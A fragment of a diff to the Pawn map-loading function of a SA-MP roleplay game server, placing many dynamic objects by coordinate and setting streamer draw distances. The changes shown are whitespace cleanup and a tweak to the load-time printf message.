 	CreateDynamicObject(2740,2391.4100000,-1716.1700000,-44.8800000,0.0000000,0.0000000,0.0000000); //
 	CreateDynamicObject(18652,2391.4100000,-1716.1800000,-43.8600000,90.0000000,0.0000000,-90.0000000); //
-	
+
 	// ------------------ Interior Caravana Tropic ------------------
-	
+
 	CreateDynamicObject(11292,1610.4042970,615.5779420,2.5935940,0.0000000,0.0000000,303.7500000); //
 	CreateDynamicObject(2395,1609.0966800,615.2355350,1.4351970,0.0000000,0.0000000,90.0000000); //
 	CreateDynamicObject(2395,1609.1684570,618.0935060,1.2165200,0.0000000,0.0000000,337.5000000); //
@@ -31855,7 +31808,7 @@ public CarregarMapas()
 	CreateDynamicObject(1828,1611.9667970,614.0911250,1.3792790,0.0000000,0.0000000,303.7500000); //
 	CreateDynamicObject(2002,1612.9848630,614.6438600,1.3551100,0.0000000,0.0000000,303.7500000); //
 	CreateDynamicObject(2103,1609.4838870,614.3743290,2.2902380,0.0000000,0.0000000,123.7500000); //
-	
+
 	// --------------------------------------------------------------------------------------------
 
 	CreateDynamicObject(10377, 1481.05005, -1787.24878, 30.60140,   0.00000, 0.00000, 90.00000);
@@ -34390,14 +34343,14 @@ public CarregarMapas()
 	CreateDynamicObject(19447, 1211.12878, -1503.51025, 12.46010,   0.00000, 90.00000, 0.00000);
 	CreateDynamicObject(19447, 1214.26367, -1509.25195, 12.46010,   0.00000, 90.00000, 0.00000);
 	CreateDynamicObject(19447, 1211.00708, -1510.35559, 12.46010,   0.00000, 90.00000, 0.00000);
-	CreateDynamicObject(19456, 1588.38806, -1638.27954, 17.18561,   0.00000, 0.00000, -89.88004);	
-	
+	CreateDynamicObject(19456, 1588.38806, -1638.27954, 17.18561,   0.00000, 0.00000, -89.88004);
+
 	new maxobjects = GetMaxObjects();
-	
+
 	for (new i = 1; i < maxobjects; i++)
 	{
 		new modelid = Streamer_GetIntData(0, i, E_STREAMER_MODEL_ID);
-		
+
 		if(modelid == 11696) // muralhas
 		{
 		    Streamer_SetFloatData(0, i, E_STREAMER_STREAM_DISTANCE, 350.0);
@@ -34407,12 +34360,11 @@ public CarregarMapas()
 			Streamer_SetFloatData(0, i, E_STREAMER_STREAM_DISTANCE, 230.0);
 		}
 	}
-	
+
 	Streamer_VisibleItems(STREAMER_TYPE_OBJECT, 980);
 
     tick2 = GetTickCount();
-	printf("\n [PC:RP] Mapa Carregado [%d objetos carregados] (%d ms)\n", maxobjects, tick2-tick1);
+	printf(" [PC:RP] Mapa Carregado [%d objetos carregados] (%d ms)", maxobjects, tick2-tick1);
 
 	return 1;
 }
-
